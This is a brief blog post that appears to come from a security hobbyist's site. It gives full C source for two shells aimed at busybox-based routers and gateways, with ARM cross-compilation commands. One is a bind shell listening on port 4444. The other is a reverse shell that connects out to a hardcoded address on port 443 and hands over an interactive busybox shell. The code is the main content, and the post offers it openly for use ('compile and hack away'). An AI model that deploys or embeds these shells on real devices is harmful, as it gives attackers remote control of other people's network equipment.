---
title: "C Shells for Routers/Gateways"
date: 2019-05-02T20:24:45+02:00
draft: false
categories:
- posts
tags:
- security
- shells
keywords:
- security
- shells
- embedded
coverSize: partial
coverMeta: in
autoThumbnailImage: true
---

Today at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.<!--more--> This was tested on a rooted home gateway that was running of an armv7l CPU. I compiled this on Ubuntu 16.04.6 LTS, therefore needing the cross-compilation libraries and tools.

Installing the libraries & tools:
```bash
root@ubuntu:~/asm$ sudo apt-get install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi libncurses5-dev libc6-armel-cross
```

Compiling:
```bash
root@ubuntu:~/asm$ arm-linux-gnueabi-gcc shell.c -g -o shell
```
If you need some shells that may work in some OpenWRT Devices, then compile and hack away!

<hr>
### Bind Shell
{{% tabbed-codeblock bind %}}
<!-- tab C-->
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#define LOCAL_PORT 4444

int main()
{
  int resultfd, sockfd;
  struct sockaddr_in my_addr;
  char *args[] = { "/bin/busybox", "sh", NULL};
  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  int one = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  my_addr.sin_family = AF_INET; // 2
  my_addr.sin_port = htons(LOCAL_PORT); // port number
  my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

  bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
  listen(sockfd, 0);
  resultfd = accept(sockfd, NULL, NULL);
  dup2(resultfd, 2);
  dup2(resultfd, 1);
  dup2(resultfd, 0);
  execve(args[0], &args[0], 0);
  return 0;
}
<!-- endtab -->
{{% /tabbed-codeblock %}}

### Reverse Shell
{{% tabbed-codeblock rev %}}
<!-- tab C-->
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#define REMOTE_ADDR "192.168.1.219"
#define REMOTE_PORT 443

int main(int argc, char *argv[])
{
  struct sockaddr_in sa;
  int s;
  char *args[] = { "/bin/busybox", "sh", NULL};
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
  sa.sin_port = htons(REMOTE_PORT);
  s = socket(AF_INET, SOCK_STREAM, 0);
  connect(s, (struct sockaddr *)&sa, sizeof(sa));
  dup2(s, 0);
  dup2(s, 1);
  dup2(s, 2);
  execve(args[0], &args[0], 0);
  return 0;
}
<!-- endtab -->
{{% /tabbed-codeblock %}}
